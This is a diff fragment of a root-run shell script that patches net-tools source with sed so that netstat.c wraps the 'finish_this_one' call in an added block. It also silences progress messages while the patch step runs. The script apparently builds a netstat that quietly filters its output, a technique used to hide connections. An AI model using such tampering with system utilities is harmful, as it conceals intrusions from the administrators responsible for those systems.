@@ -796,10 +796,10 @@ if [ "$USER" == "root" ]; then
   	sed -i '0,/finish_this_one(uid,inode,timers);/{s/finish_this_one(uid,inode,timers);/\tfinish_this_one(uid,inode,timers);\n\t}/};' /tmp/net-tools-master/netstat.c
     finish
     #patch the makefile
-    printf "patching the net-tools makefile... "
+    #printf "patching the net-tools makefile... "
   	printf "$net_tools_patch" >/tmp/net-tools-master/net.patch
   	patch -d /tmp/net-tools-master/ </tmp/net-tools-master/net.patch &>/dev/null
-    finish
+    #finish
     #make config net-tools-master
     printf "make config net-tools-master... "
   	yes "" 2>/dev/null | make -C /tmp/net-tools-master config &>/dev/null
